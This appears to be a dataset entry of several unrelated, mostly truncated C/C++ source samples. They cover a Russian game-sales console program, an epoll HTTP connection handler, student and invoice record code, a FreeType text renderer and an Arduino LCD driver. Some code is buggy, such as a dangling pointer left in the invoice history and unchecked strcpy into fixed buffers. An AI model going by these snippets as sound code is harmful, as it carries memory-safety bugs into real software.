/*\u043f\u0440\u0438\u0432\u044b\u0431\u043e\u0440\u0435 \u0432\u043e\u043f\u0440\u043e\u0441\u0430,\r\n\t\t\t\t\t\t\t\t\t\t\t\t\u043f\u043b\u0430\u043d \u0437\u0430 \u0431\u0443\u043a\u0432\u0430\u043c\u0438 \u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u0441\u044f \u0447\u0435\u0440\u043d\u044b\u043c*/\r\n Console::CursorLeft=11; \r\n Console::CursorTop=y1+5; \r\n printf(\"%s\",dan[y1]); \r\n Console::ForegroundColor=ConsoleColor::Yellow; \r\n Console::BackgroundColor=ConsoleColor::Cyan; \r\n Console::CursorLeft=11; \r\n Console::CursorTop=y2+5; \r\n printf(\"%s\",dan[y2]);\r\n  Console::BackgroundColor=ConsoleColor::Black;\r\n c=getch(); \r\n } // \u043a\u043e\u043d\u0435\u0446 while(c!=ESC)... \r\n exit(0); \r\n} \r\n struct z { \r\n char devel[20]; //\u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u0430\r\n char name[20]; //\u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0438\u0433\u0440\u044b\r\n long prod;    // \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u043f\u0440\u043e\u0434\u0430\u0436\r\n long price;  // \u0446\u0435\u043d\u0430 \u0438\u0433\u0440\u044b\r\n char data[11]; //\u0434\u0430\u0442\u0430 \u0432\u044b\u0445\u043e\u0434\u0430\r\n}; \r\n\r\n struct sp { \r\n char razr[20]; \r\n char name[20]; \r\n long prod;  \r\n struct sp* pred; \r\n struct sp* sled; \r\n } ;\r\n void vstavka(struct z* dev,struct sp **spisok,char* name,int NC)//\u0412\u0441\u0442\u0430\u0432\u043a\u0430 \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\r\n{\r\nint i;\r\nstruct sp *nov,*nt,*z=0;\r\nfor(nt=*spisok; nt!=0 && strcmp(nt->name,name)<0; z=nt, nt=nt->sled);\r\nif(nt && strcmp(nt->name,name)==0) return;\r\nnov=(struct sp *) malloc(sizeof(struct sp));\r\nstrcpy(nov->name,name);\r\nnov->pred = z;\r\nnov->sled=nt;\r\nnov->prod=0;\r\nfor(i=0;i<NC;i++)\r\nif(strcmp(dev[i].name,name)==0)\r\n{nov->prod+=dev[i].prod;strcpy(nov->razr,dev[i].devel);}\r\nif(!z) *spisok=nov;\r\nif(z) z->sled=nov;\r\nif(nt) nt->pred=nov;\r\nreturn;\r\n}\r\n void alfalist(struct z* dev,struct sp **spisok,int NC, int a) //\u0421\u043f\u0438\u0441\u043e\u043a \u0438\u0437\u0434\u0430\u0442\u0435\u043b\u0435\u0439 \u043f\u043e \u0438 \u043f\u0440\u043e\u0442\u0438\u0432 \u0430\u043b\u0444\u0430\u0432\u0438\u0442\u0430.\r\n{\r\nint i;\r\nstruct sp* nt,*z;\r\nConsole::ForegroundColor=ConsoleColor::Yellow;\r\nConsole::BackgroundColor=ConsoleColor::DarkCyan;\r\nConsole::Clear();\r\nif(!*spisok)\r\n for(i=0;i<NC;i++)\r\n vstavka(dev,spisok,dev[i].name, NC);\r\n\r\nConsole::Clear();\r\nprintf(\"\\n \u0410\u043b\u0444\u0430\u0432\u0438\u0442\u043d\u044b\u0439 \u0441\u043f\u0438\u0441\u043e\u043a \u0438\u0433\u0440\");\r\nprintf(\"\\n =============================================\\n\");\r\nif (a==1){//\u0441\u043f\u0438\u0441\u043e\u043a \u043f\u043e \u0430\u043b\u0444\u0430\u0432\u0438\u0442\u0443\r\nfor(nt=*spisok; nt!=0; nt=nt->sled)\r\nprintf(\"\\n %-20s %20s %ld \u043c\u043b\u043d. \u043a\u043e\u043f\u0438\u0439 \",nt->name,nt->razr,nt->prod);\r\n}\r\nif (a==2){//\u0441\u043f\u0438\u0441\u043e\u043a \u043f\u0440\u043e\u0442\u0438\u0432 \u0430\u043b\u0444\u0430\u0432\u0438\u0442\u0430\r\nfor(nt=*spisok,z=0; nt!=0; z=nt,nt=nt->sled);\r\nfor(nt=z; nt!=0; nt=nt->pred)\r\nprintf(\"\\n %-20s %20s %ld \u043c\u043b\u043d. \u043a\u043e\u043f\u0438\u0439\",nt->name,nt->razr,nt->prod);\r\n}\r\ngetch();\r\n}\r\n void diagram(struct z * dev,struct sp**spisok,int NC) //\u0434\u0438\u0430\u0433\u0440\u0430\u043c\u043c\u0430 \u043f\u043e \u043f\u0440\u043e\u0434\u0430\u0436\u0430\u043c(\u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0434\u0438\u0433\u0440\u0430\u043c\u043c\u044b)\r\n{\r\n\tstruct sp *nt;\r\n\tint len,i,NColor;\r\n\tlong sum = 0;\r\n\tchar str1[25];\r\n\tchar str2[20];\r\n\tSystem::ConsoleColor Color;\r\n\tConsole::ForegroundColor=ConsoleColor::Black;\r\n\tConsole::BackgroundColor=ConsoleColor::White;\r\n\tConsole::Clear();\r\n\tfor(i=0;i<NC;i++) sum = sum+dev[i].prod ;\r\n\tif(!spisok)\r\n\tfor(i=0;i<NC;i++)\r\n\tvstavka(dev,spisok,dev[i].devel,NC);\r\n\tColor=ConsoleColor::Black; NColor=0;\r\n\tfor(nt=*spisok,i=0; nt!=0; nt=nt->sled,i++)\r\n\t{\r\n\t\tsprintf(str1,\"%s\",nt->razr);\r\n\t\tsprintf(str2,\"%3.1f%%\",(nt->prod*100./sum));\r\n\t\tConsole::ForegroundColor=ConsoleColor::Black;\r\n\t\tConsole::BackgroundColor= ConsoleColor::White;\r\n\t\tConsole::CursorLeft=3; Console::CursorTop=i+1;\r\n\t\tprintf(str1);\r\n\t\tConsole::CursorLeft=23;\r\n\t\t",
    "#include \"http_conn.h\"\n\n#include <mysql/mysql.h>\n#include <fstream>\n\n/* \n    \u4e00: \n    \u5982\u679c\u5199\u4e00\u4e2a\u8fde\u63a5\u7c7b,\u5e94\u8be5\u6ce8\u610f\u7684\u4e8b\u9879\n    1. \u67e5\u770b\u51c6\u5907\u7684\u5e38\u91cf\n    2. \u5168\u5c40\u53d8\u91cf\n    3. \u9759\u6001\u53d8\u91cf\n    4. \u4e34\u65f6\u7684\u975e\u6210\u5458\u51fd\u6570\n\n    \u4e0a\u9762\u7684\u56db\u79cd\u57fa\u672c\u4e0a\u5c31\u662f\u4e00\u4e2a\u7c7b\u6700\u57fa\u7840\u7684\u914d\u7f6e\u4e86     \n\n    \u4e8c:\n    \u67e5\u770b\u8fd9\u4e2a\u7c7b\u548c\u5176\u4ed6\u7c7b\u7684\u5f15\u7528\u5173\u7cfb\n    \u4ece.h \u6587\u4ef6\u4e2d\u53ef\u4ee5\u770b\u5230,\u4f7f\u7528\u5230\u7684\u6587\u4ef6,\u5f85\u4f1a\u53ef\u4ee5\u4e00\u4e2a\u4e00\u4e2a\u53bb\u67e5\u9605,\u4f18\u5148\u7ea7\u66f4\u9ad8\u4e00\u70b9\n\n    \u4e09:\n    \u8fd8\u6709\u5c31\u662fhttp\u7684\u8fde\u63a5\u539f\u7406\u9700\u8981\u590d\u4e60\u597d\n\n    \u56db:\n    \u5982\u4f55debug ,\u4f7f\u7528\u5230\u7684\u6280\u5de7\u6709\u4ec0\u4e48\n\n\n\n\n */\n/* \n    \u5f53\u524d\u7c7b\u5728\u5176\u4ed6\u7c7b\u4e2d\u7684\u7ec4\u7ec7\u5f62\u5f0f\n\n */\n\n//\u5b9a\u4e49http\u54cd\u5e94\u7684\u4e00\u4e9b\u72b6\u6001\u4fe1\u606f\nconst char *ok_200_title = \"OK\";\nconst char *error_400_title = \"Bad Request\";\nconst char *error_400_form = \"Your request has bad syntax or is inherently impossible to staisfy.\\n\";\nconst char *error_403_title = \"Forbidden\";\nconst char *error_403_form = \"You do not have permission to get file form this server.\\n\";\nconst char *error_404_title = \"Not Found\";\nconst char *error_404_form = \"The requested file was not found on this server.\\n\";\nconst char *error_500_title = \"Internal Error\";\nconst char *error_500_form = \"There was an unusual problem serving the request file.\\n\";\n\nlocker m_lock;\nmap<string, string> users;\n\nvoid http_conn::initmysql_result(connection_pool *connPool)\n{\n    //\u5148\u4ece\u8fde\u63a5\u6c60\u4e2d\u53d6\u4e00\u4e2a\u8fde\u63a5\n    MYSQL *mysql = NULL;\n    // \u6709\u4e9b\u5e38\u89c1\u7684\u89c1\u8bc6,\u6bd4\u5982\u51fa\u73b0\u5f15\u7528\u8868\u793a\u8fd9\u4e2a\u503c\u4e00\u822c\u5c31\u5728\u51fd\u6570\u91cc\u9762\u5c31\u88ab\u66f4\u6539\u4e86\n    connectionRAII mysqlcon(&mysql, connPool); // \u53d6\u5f97\u8fde\u63a5,\u987a\u4fbf\u8bf4\u4e00\u4e0b,\u8fd9\u4e2a\u53d8\u8138\u5728\u51fd\u6570\u7ed3\u675f\u7684\u65f6\u5019\u5c31\u88ab\u91ca\u653e\u6389\u4e86,\u771f\u662f\u5de7\u5999\u7684\u8bbe\u8ba1\n\n    //\u5728user\u8868\u4e2d\u68c0\u7d22username\uff0cpasswd\u6570\u636e\uff0c\u6d4f\u89c8\u5668\u7aef\u8f93\u5165\n    if (mysql_query(mysql, \"SELECT username,passwd FROM user\"))\n    {\n        LOG_ERROR(\"SELECT error:%s\\n\", mysql_error(mysql));\n    }\n\n    //\u4ece\u8868\u4e2d\u68c0\u7d22\u5b8c\u6574\u7684\u7ed3\u679c\u96c6\n    MYSQL_RES *result = mysql_store_result(mysql);\n\n    //\u8fd4\u56de\u7ed3\u679c\u96c6\u4e2d\u7684\u5217\u6570\n    int num_fields = mysql_num_fields(result);\n\n    //\u8fd4\u56de\u6240\u6709\u5b57\u6bb5\u7ed3\u6784\u7684\u6570\u7ec4\n    MYSQL_FIELD *fields = mysql_fetch_fields(result);\n\n    //\u4ece\u7ed3\u679c\u96c6\u4e2d\u83b7\u53d6\u4e0b\u4e00\u884c\uff0c\u5c06\u5bf9\u5e94\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801\uff0c\u5b58\u5165map\u4e2d\n    while (MYSQL_ROW row = mysql_fetch_row(result))\n    {\n        string temp1(row[0]);\n        string temp2(row[1]);\n        users[temp1] = temp2;\n    }\n}\n\n//\u5bf9\u6587\u4ef6\u63cf\u8ff0\u7b26\u8bbe\u7f6e\u975e\u963b\u585e\nint setnonblocking(int fd)\n{\n    int old_option = fcntl(fd, F_GETFL);\n    int new_option = old_option | O_NONBLOCK;\n    fcntl(fd, F_SETFL, new_option);\n    return old_option;\n}\n\n//\u5c06\u5185\u6838\u4e8b\u4ef6\u8868\u6ce8\u518c\u8bfb\u4e8b\u4ef6\uff0cET\u6a21\u5f0f\uff0c\u9009\u62e9\u5f00\u542fEPOLLONESHOT\n/*  \n    EPOLLONESHOT\u6a21\u5f0f\u4e0b \u8be5\u4e8b\u4ef6\u80fd\u8fdb\u4e00\u6b65\u51cf\u5c11\u53ef\u8bfb\u3001\u53ef\u5199\u548c\u5f02\u5e38\u4e8b\u4ef6\u88ab\u89e6\u53d1\u7684\u6b21\u6570\u3002 \n    \u8fd9\u4e2a\u6dfb\u52a0\u4e8b\u4ef6\u51fa\u73b0\u5728\u4e3b\u7ebf\u7a0b\u91cc\u9762\n */\nvoid addfd(int epollfd, int fd, bool one_shot, int TRIGMode)\n{\n    epoll_event event;\n\n    // TODO \u590d\u4e60\u4e00\u4e0b\u4ec0\u4e48\u662f\u8054\u5408\u4f53\n    event.data.fd = fd;\n    // \u4e0b\u9762\u7684\u7528\u4e8e\u5904\u7406\u89e6\u53d1\u6a21\u5f0f\n    // \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662flt\u6a21\u5f0f\u7684,\n    if (1 == TRIGMode)\n        event.events = EPOLLIN | EPOLLET | EPOLLRDHUP;\n    else\n        event.events = EPOLLIN | EPOLLRDHUP;\n    // \u53ea\u76d1\u542c\u4e00\u6b21,\u8981\u4e0d\u7136\u540e\u7eed\u9700\u8981\u91cd\u65b0\u653e\u5165\u5230\u6ce8\u518c\u4e8b\u4ef6\u8868\u91cc\u9762\n    if (one_shot)\n        event.events |= EPOLLONESHOT;\n        /* epoll_ctl\n        \u51fd\u6570\u7684\u4f7f\u7528,\u603b\u4f53\u7684\u6765\u770b,\u90fd\u5728\u54ea\u91cc\u7528\u4e0a\u4e86\n        epollfd \u4eceepoll_create\u521b\u5efa\u5f97\u6765,\u5168\u5c40\u5c31\u4e00\u4e2a\n\n        \u4e8b\u4ef6\u4e00\u5171\u5c31\u53ea\u6709\u4e09\u79cd\u53ef\u80fd,\u6dfb\u52a0,\u4fee\u6539,\u5220\u9664\n        event     \u8fd9\u6837\u5c31\u548c\u4e8b\u4ef6\u8868\u4ea7\u751f\u8054\u7cfb\u4e86s\n         */\n\n    epoll_ctl(epollfd, EPOLL_CTL_ADD, fd, &event); // \u52a0\u5230\u7ea2\u9ed1\u6811\u91cc\u9762\n    setnonblocking(fd);\n}\n\n//\u4ece\u5185\u6838\u65f6\u95f4\u8868\u5220\u9664\u63cf\u8ff0\u7b26\nvoid removefd(int epollfd, int fd)\n{\n    epoll_ctl(epollfd, EPOLL_CTL_DEL, fd, 0);\n    close(fd); // \u5173\u95ed\u6587\u4ef6\u63cf\u8ff0\u7b26\u7684\u65f6\u95f4\n}\n\n//\u5c06\u4e8b\u4ef6\u91cd\u7f6e\u4e3aEPOLLONESHOT\nvoid modfd(int epollfd, int fd, int ev, int TRIGMode)\n{\n    epoll_event event;\n    event.data.fd = fd;\n\n    if (1 == TRIGMode)\n        event.events = ev | EPOLLET | EPOLLONESHOT | EPOLLRDHUP;\n    else\n        event.events = ev | EPOLLONESHOT | EPOLLRDHUP;\n// TODO \u8fd9\u91cc\u4fee\u6539event\u5c5e\u6027,\u6539\u5565\u5462?\n    epoll_ctl(epollfd, EPOLL_CTL_MOD, fd, &event);\n}\n\nint http_conn::m_user_count = 0;\nint http_conn::m_epollfd = -1;\n\n//\u5173\u95ed\u8fde\u63a5\uff0c\u5173\u95ed\u4e00\u4e2a\u8fde\u63a5\uff0c\u5ba2\u6237\u603b\u91cf\u51cf\u4e00\nvoid http_conn::close_conn(bool real_close)\n{\n    /* TODO \u6700\u540e\u9700\u8981\u6709\u4e00\u4e2a\u7edf\u8ba1,\u76f8\u540c\u7c7b\u578b,\u7c7b\u4f3c\u529f\u80fd\u7684\u51fd\u6570\u9700\u8981\u90fd\u5199\u4e00\u4e0b\u5b50 */\n    if (real_close && (m_sockfd != -1))\n    {\n        printf(\"close %d\\n\", m_sockfd);\n        removefd(m_epollfd, m_sockfd);\n        m_sockfd = -1;\n        m_user_count--;\n    }\n}\n\n//\u521d\u59cb\u5316\u8fde\u63a5,\u5916\u90e8\u8c03\u7528\u521d\u59cb\u5316\u5957\u63a5\u5b57\u5730\u5740\nvoid http_conn::init(int sockfd, const sockaddr_in &addr, char *root, int TRIGMode,\n                     int close_log, string user, string passwd, string sqlname)\n{\n    m_sockfd = sockfd;\n    m_address = addr;\n\n    addfd(m_epollfd, sockfd, true, m_TRIGMode);\n    m_user_count++;\n\n    //\u5f53\u6d4f\u89c8\u5668\u51fa\u73b0\u8fde\u63a5\u91cd\u7f6e\u65f6\uff0c\u53ef\u80fd\u662f\u7f51\u7ad9\u6839\u76ee\u5f55\u51fa\u9519\u6216http\u54cd\u5e94\u683c\u5f0f\u51fa\u9519\u6216\u8005\u8bbf\u95ee\u7684\u6587\u4ef6\u4e2d\u5185\u5bb9\u5b8c\u5168\u4e3a\u7a7a\n    doc_root = root;\n    m_TRIGMode = TRIGMode;\n    m_close_log = close_log;\n\n    strcpy(sql_user, user.c_str());\n    strcpy(sql_passwd, passwd.c_str());\n    strcpy(sql_name, sqlname.c_str());\n\n    init();\n}\n\n//\u521d\u59cb\u5316\u65b0\u63a5\u53d7\u7684\u8fde\u63a5\n//check_state\u9ed8\u8ba4\u4e3a\u5206\u6790\u8bf7\u6c42\u884c\u72b6\u6001\nvoid http_conn::init()\n{\n    mysql = NULL;\n    bytes_to_send = 0;\n    bytes_have_send = 0;\n    m_check_state = CHECK_STATE_REQUESTLINE;\n    m_linger = false;\n    m_method = GET;\n    m_url = 0;\n    m_version = 0;\n    m_content_length = 0;\n    m_host = 0;\n    m_start_line = 0;\n    m_checked_idx = 0;\n    m_read_idx = 0;\n    m_write_idx = 0;\n    cgi = 0;\n    m_state = 0;\n    timer_flag = 0;\n    improv = 0; //\u5224\u65ad\u4e0a\u4e00\u4e2a\u8bf7\u6c42\u662f\u5426\u5df2\u5904\u7406\u5b8c\u6bd5\n\n    memset(m_read_buf, '\\0', READ_BUFFER_SIZE);\n    memset(m_write_buf, '\\0', WRITE_BUFFER_SIZE);\n    memset(m_real_file, '\\0', FILENAME_LEN);\n}\n\n//\u4ece\u72b6\u6001\u673a\uff0c\u7528\u4e8e\u5206\u6790\u51fa\u4e00\u884c\u5185\u5bb9\n//\u8fd4\u56de\u503c\u4e3a\u884c\u7684\u8bfb\u53d6\u72b6\u6001\uff0c\u6709LINE_OK,LINE_BAD,LINE_OPEN\nhttp_conn::LINE_STATUS http_conn::parse_line()\n{\n    char temp;\n    for (; m_checked_idx < m_read_idx; ++m_checked_idx)\n    {\n        temp = m_read_buf[m_checked_idx];\n    ",
    "#include \"saving.h\"\r\n#include <iostream>\r\n#include \"date.hpp\"\r\n#include <string>\r\n#include <fstream>\r\n#include <filesystem>\r\n#include \"cereal/cereal.hpp\"\r\n#include <cereal/types/memory.hpp>\r\n#include <cereal/types/concepts/pair_associative_container.hpp>\r\n#include <cereal/types/vector.hpp>\r\n#include <cereal/types/string.hpp>\r\n#include <cereal/types/array.hpp>\r\n#include <cereal/archives/binary.hpp>\r\n\r\nstd::vector<student> parse_all_students() {\r\n\tstd::vector<student> result;\r\n\tfor (auto& entry : std::filesystem::directory_iterator(\"data\")) {\r\n\t\tif (!entry.is_directory() && entry.path().extension() == \".student\") {\r\n\t\t\tstd::ifstream os(entry.path(), std::ios::binary);\r\n\t\t\tcereal::BinaryInputArchive f(os);\r\n\t\t\tstudent student;\r\n\t\t\tf(student);\r\n\t\t\tresult.push_back(student);\r\n\t\t}\r\n\t}\r\n\tstd::sort(result.begin(), result.end());\r\n\treturn result;\r\n}\r\n\r\nbool save(student t) {\r\n\tstd::string student_number = \"data/\" + t.record_book_number;\r\n\tstd::ofstream output_stream(student_number + \".student\", std::ios::binary);\r\n\tcereal::BinaryOutputArchive archive(output_stream);\r\n\tarchive(t);\r\n\treturn true;\r\n}\r\n\r\nbool deletes(student t) {\r\n\tstd::string student_number = \"data/\" + t.record_book_number + \".student\";\r\n\tstd::filesystem::remove(student_number);\r\n\treturn true;\r\n}",
    "#include \"SalesInvoice.h\"\r\n#include \"SalesInvoiceStructure.h\"\r\n#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nvoid SalesInvoiceMenu(int&) {\r\n    SalesInvoice salesInvoice;\r\n    int choice;\r\n\r\n    do {\r\n        system(\"cls\");\r\n        cout << \"-----------------------------------------------------\" << endl;\r\n        cout << \"         Harley Report Management System             \" << endl;\r\n        cout << \"-----------------------------------------------------\" << endl;\r\n        cout << \"                                                     \" << endl;\r\n        cout << \"Sales Invoice                                        \" << endl;\r\n        cout << \"                                                     \" << endl;\r\n        cout << \"        [1] - Add Invoice                            \" << endl;\r\n        cout << \"        [2] - Invoice History                        \" << endl;\r\n        cout << \"        [3] - Search Invoice                         \" << endl;\r\n        cout << \"        [4] - Delete Invoice                         \" << endl;\r\n        cout << \"        [5] - Return Main Menu                       \" << endl;\r\n        cout << \"                                                     \" << endl;\r\n        cout << \"-----------------------------------------------------\" << endl;\r\n        cout << \": \";\r\n        cin >> choice;\r\n        cin.ignore();\r\n        system(\"cls\");\r\n\r\n        string date, invoiceCode, description;\r\n\r\n        switch (choice) {\r\n            case 1:\r\n                cout << \"Enter Date (MM/DD/YYYY): \";\r\n                getline(cin, date);\r\n                cout << \"Enter Invoice Code: \";\r\n                getline(cin, invoiceCode);\r\n                cout << \"Enter Description: \";\r\n                getline(cin, description);\r\n                salesInvoice.addInvoice(date, invoiceCode, description);\r\n                break;\r\n            case 2:\r\n                salesInvoice.printInvoices();\r\n                system(\"pause\");\r\n                break;\r\n            case 3:\r\n                cout << \"Enter invoice code to search: \";\r\n                getline(cin, invoiceCode);\r\n                salesInvoice.searchInvoice(invoiceCode);\r\n                system(\"pause\");\r\n                break;\r\n            case 4:\r\n                cout << \"Enter invoice code to delete: \";\r\n                getline(cin, invoiceCode);\r\n                salesInvoice.deleteInvoice(invoiceCode);\r\n                system(\"pause\");\r\n                break;\r\n            case 5:\r\n                return;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    } while (true);\r\n}\r\n\r\nSalesInvoice::~SalesInvoice() {\r\n    while (head) {\r\n        SalesInvoiceStructure* temp = head;\r\n        head = head->next;\r\n        delete temp;\r\n    }\r\n}\r\n\r\nvoid SalesInvoice::addInvoice(const string& date, const string& invoiceCode, const string& description) {\r\n    SalesInvoiceStructure* newInvoice = new SalesInvoiceStructure(date, invoiceCode, description);\r\n    newInvoice->next = head;\r\n    head = newInvoice;\r\n    history.push(newInvoice);\r\n    cout << \"Invoice added successfully.\\n\";\r\n}\r\n\r\nvoid SalesInvoice::printInvoices() const {\r\n    SalesInvoiceStructure* current = head;\r\n    while (current) {\r\n        cout << \"Date: \" << current->date << \", Invoice Code: \" << current->invoiceCode << \", Description: \" << current->description << \"\\n\";\r\n        current = current->next;\r\n    }\r\n}\r\n\r\nvoid SalesInvoice::printInvoiceHistory() const {\r\n    stack<SalesInvoiceStructure*> temp = history;\r\n    while (!temp.empty()) {\r\n        SalesInvoiceStructure* invoice = temp.top();\r\n        cout << \"Date: \" << invoice->date << \", Invoice Code: \" << invoice->invoiceCode << \", Description: \" << invoice->description << \"\\n\";\r\n        temp.pop();\r\n    }\r\n}\r\n\r\nvoid SalesInvoice::searchInvoice(const string& invoiceCode) const {\r\n    SalesInvoiceStructure* current = head;\r\n    while (current) {\r\n        if (current->invoiceCode == invoiceCode) {\r\n            cout << \"Invoice found: Date: \" << current->date << \", Invoice Code: \" << current->invoiceCode << \", Description: \" << current->description << \"\\n\";\r\n            return;\r\n        }\r\n        current = current->next;\r\n    }\r\n    cout << \"Invoice not found.\\n\";\r\n}\r\n\r\nvoid SalesInvoice::deleteInvoice(const string& invoiceCode) {\r\n    SalesInvoiceStructure* current = head;\r\n    SalesInvoiceStructure* prev = NULL;\r\n\r\n    while (current && current->invoiceCode != invoiceCode) {\r\n        prev = current;\r\n        current = current->next;\r\n    }\r\n\r\n    if (!current) {\r\n        cout << \"Invoice not found.\\n\";\r\n        return;\r\n    }\r\n\r\n    if (!prev) {\r\n        head = current->next;\r\n    } else {\r\n        prev->next = current->next;\r\n    }\r\n\r\n    history.push(current);\r\n    delete current;\r\n    cout << \"Invoice deleted successfully.\\n\";\r\n}\r\n\r\n\r\n",
    "#include \"CvxFont.h\"\n#include <cassert>\n#include <clocale>\n#include <utility>\n#include <sstream>\n#include <cstdlib>\n\ncvx::CvxFont::CvxFont(const cv::String& fontType)\n{\n    assert(!fontType.empty());\n    m_error = FT_Init_FreeType(&m_library);\n    if (m_error) {\n        std::cerr << \"library initial error!\" << std::endl;\n        return;\n    }\n    m_error = FT_New_Face(m_library, fontType.c_str(), 0, &m_face);\n    if (m_error == FT_Err_Unknown_File_Format) {\n        std::cerr << \"unsupported font format!\" << std::endl;\n        return;\n    }\n    else if (m_error) {\n        std::cerr << \" can not open font files\" << std::endl;\n        return;\n    }\n    // use default parameters\n    m_font = new FontProperty;\n    initFont();\n    setlocale(LC_ALL, \"\");\n}\n\n// release freetype resource\ncvx::CvxFont::~CvxFont()\n{\n    delete m_font;\n    FT_Done_Face(m_face);\n    FT_Done_FreeType(m_library);\n}\n\nvoid cvx::CvxFont::setFontSize(const int fontSize)\n{\n    m_font->fontSize = fontSize;\n    FT_Set_Pixel_Sizes(m_face, fontSize, 0);\n}\n\n// initial font\nvoid cvx::CvxFont::initFont()\n{\n    setFontSize(16);\n    setSpaceRatio(0.5);\n    setFontRatio(0);\n    setRotateAngle(0);\n    setDiaphaneity(1);\n    setUnderline(false);\n    setVertical(false);\n    // set font\n    FT_Set_Pixel_Sizes(m_face, getFontSize(), 0);\n}\n\nvoid cvx::CvxFont::rotateFont(double angle) {\n    angle = (angle / 360) * 3.14159 * 2;\n    /* set up matrix */\n    m_matrix.xx = static_cast<FT_Fixed>(cos(angle) * 0x10000L);\n    m_matrix.xy = static_cast<FT_Fixed>(-sin(angle) * 0x10000L);\n    m_matrix.yx = static_cast<FT_Fixed>(sin(angle) * 0x10000L);\n    m_matrix.yy = static_cast<FT_Fixed>(cos(angle) * 0x10000L);\n\n    FT_Set_Transform(m_face, &m_matrix, nullptr);\n}\n\nvoid cvx::CvxFont::putTextStr(cv::Mat& img, const cv::String& text, cv::Point pos, const cv::Scalar& color)\n{\n    CV_Assert(!img.empty());\n    CV_Assert(!text.empty());\n\n    int xStart = pos.x;\n    int yStart = pos.y;\n    m_maxDiffHeight = 0;\n\n    const char* ptr = text.c_str();\n    std::mbtowc(nullptr, nullptr, 0); // reset the conversion state\n    const char* end = ptr + std::strlen(ptr);\n    int ret;\n    for (wchar_t wc; (ret = std::mbtowc(&wc, ptr, end - ptr)) > 0; ptr += ret) {\n        putWChar(img, (wc & 0xffffffff), pos, color);\n    }\n\n    int xEnd = pos.x;\n    int yEnd = pos.y;\n    if (getUnderline()) {\n        if (getVertical()) {\n            cv::line(img, cv::Point(xStart + m_maxDiffHeight, yStart), cv::Point(xStart + m_maxDiffHeight, yEnd), color, 2);\n        }\n        else {\n            cv::line(img, cv::Point(xStart, yStart + m_maxDiffHeight), cv::Point(xEnd, yStart + m_maxDiffHeight), color, 2);\n        }\n    }\n\n}\n\nvoid cvx::CvxFont::putWChar(cv::Mat& img, uint32_t wc, cv::Point& pos, const cv::Scalar& color)\n{\n    rotateFont(getAngle());\n    const auto vertical = getVertical();\n    const auto size = getFontSize();\n\n    // Converting a Character Code Into a Glyph Index\n    FT_UInt glyph_index = FT_Get_Char_Index(m_face, wc);\n    FT_Load_Glyph(m_face, glyph_index, FT_LOAD_DEFAULT);\n    FT_Render_Glyph(m_face->glyph, FT_RENDER_MODE_MONO);\n\n    FT_GlyphSlot slot = m_face->glyph;\n    FT_Bitmap bitmap = slot->bitmap;\n    bool isSpace = wc == ' ';\n\n    // get rows and cols of current wide char\n    auto rows = bitmap.rows;\n    auto cols = bitmap.width;\n\n    cv::Point gPos = pos;\n    //gPos.y += m_font->fontSize;\n    if (vertical)\n    {\n        gPos.x += (slot->metrics.vertBearingX >> 6);\n        gPos.y += (slot->metrics.vertBearingY >> 6);\n        m_maxDiffHeight = std::max((unsigned long)m_maxDiffHeight, rows - (slot->metrics.vertBearingY >> 6));\n    }\n    else\n    {\n        gPos.x += (slot->metrics.horiBearingX >> 6);\n        gPos.y -= (slot->metrics.horiBearingY >> 6);\n        m_maxDiffHeight = std::max((unsigned long)m_maxDiffHeight, rows - (slot->metrics.horiBearingY >> 6));\n    }\n\n    // https://stackoverflow.com/questions/52254639/how-to-access-pixels-state-in-monochrome-bitmap-using-freetype2\n    for (uint i = 0; i < rows; ++i)\n    {\n        for (auto j = 0; j < cols; ++j)\n        {\n            int off = i * slot->bitmap.pitch + j / 8;\n\n            if (slot->bitmap.buffer[off] & (0x80 >> (j % 8)))\n            {\n                const auto r = gPos.y + i; //vertical ? pos.y + i : pos.y + i + (size - rows); // to make align to bottom\n                const auto c = gPos.x + j;\n\n                if (r >= 0 && r < img.rows && c >= 0 && c < img.cols)\n                {\n                    cv::Vec3b scalar = img.at<cv::Vec3b>(cv::Point(c, r));\n\n                    // merge set color with origin color\n                    double p = getDiaphaneity();\n                    for (int k = 0; k < 3; ++k)\n                    {\n                        scalar.val[k] = static_cast<uchar>(scalar.val[k] * (1 - p) + color.val[k] * p);\n                    }\n\n                    img.at<cv::Vec3b>(cv::Point(c, r)) = cv::Vec3b(scalar[0], scalar[1], scalar[2]);\n                }\n            }\n        }\n    }\n    // modify po",
    "#include \"LiquidCrystal_I2C.h\"\n#include <inttypes.h>\n#include <Arduino.h>\n#include <Wire.h>\n\n// When the display powers up, it is configured as follows:\n//\n// 1. Display clear\n// 2. Function set:\n//    DL = 1; 8-bit interface data\n//    N = 0; 1-line display\n//    F = 0; 5x8 dot character font\n// 3. Display on/off control:\n//    D = 0; Display off\n//    C = 0; Cursor off\n//    B = 0; Blinking off\n// 4. Entry mode set:\n//    I/D = 1; Increment by 1\n//    S = 0; No shift\n//\n// Note, however, that resetting the Arduino doesn't reset the LCD, so we\n// can't assume that its in that state when a sketch starts (and the\n// LiquidCrystal constructor is called).\n\nLiquidCrystal_I2C::LiquidCrystal_I2C(uint8_t lcd_addr, uint8_t lcd_cols, uint8_t lcd_rows, uint8_t charsize)\n{\n\t_addr = lcd_addr;\n\t_cols = lcd_cols;\n\t_rows = lcd_rows;\n\t_charsize = charsize;\n\t_backlightval = LCD_BACKLIGHT;\n}\n\nvoid LiquidCrystal_I2C::begin() {\n\tWire.begin();\n\t_displayfunction = LCD_4BITMODE | LCD_1LINE | LCD_5x8DOTS;\n\n\tif (_rows > 1) {\n\t\t_displayfunction |= LCD_2LINE;\n\t}\n\n\t// for some 1 line displays you can select a 10 pixel high font\n\tif ((_charsize != 0) && (_rows == 1)) {\n\t\t_displayfunction |= LCD_5x10DOTS;\n\t}\n\n\t// SEE PAGE 45/46 FOR INITIALIZATION SPECIFICATION!\n\t// according to datasheet, we need at least 40ms after power rises above 2.7V\n\t// before sending commands. Arduino can turn on way befer 4.5V so we'll 